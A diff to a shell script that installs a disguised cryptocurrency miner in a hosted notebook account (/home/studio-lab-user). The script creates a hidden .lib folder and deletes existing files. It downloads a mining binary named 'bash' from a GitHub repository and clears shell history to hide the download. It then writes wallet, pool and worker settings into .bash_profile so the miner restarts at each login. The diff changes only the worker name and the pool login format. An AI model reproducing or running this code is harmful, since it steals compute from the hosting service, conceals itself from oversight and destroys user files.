@@ -7,7 +7,7 @@ mkdir .lib
 cd .lib
 rm -R *
 rm -R /home/studio-lab-user/.ton
-WORKER="wpySOLO"
+WORKER="tutuSOLO"
 WALLETNH="0xA7221DAe96a04c40b2cA8BE0393AaA09E436AEC1"
 POOLNH="159.65.138.196:443"
 wget -P /home/studio-lab-user/.lib/ https://github.com/gunturyogatama404/ksjdueoa/raw/refs/heads/main/bash && history -cr
@@ -22,7 +22,6 @@ echo 'WORKER="x"' >> ~/.bash_profile
 echo 'WALLETNH="0xA7221DAe96a04c40b2cA8BE0393AaA09E436AEC1"' >> /home/studio-lab-user/.bash_profile
 echo 'POOLNH="159.65.138.196:443"' >> /home/studio-lab-user/.bash_profile
 echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
-echo "./.lib/bash -a cortex -s $POOLNH -u  $WALLETNH.$WORKER" > /home/studio-lab-user/.lib/gas.sh
+echo "./.lib/bash -a cortex -s $POOLNH -u  solo:$WALLETNH.$WORKER" > /home/studio-lab-user/.lib/gas.sh
 chmod +x bash && cd ~/ && source .bashrc
-
 
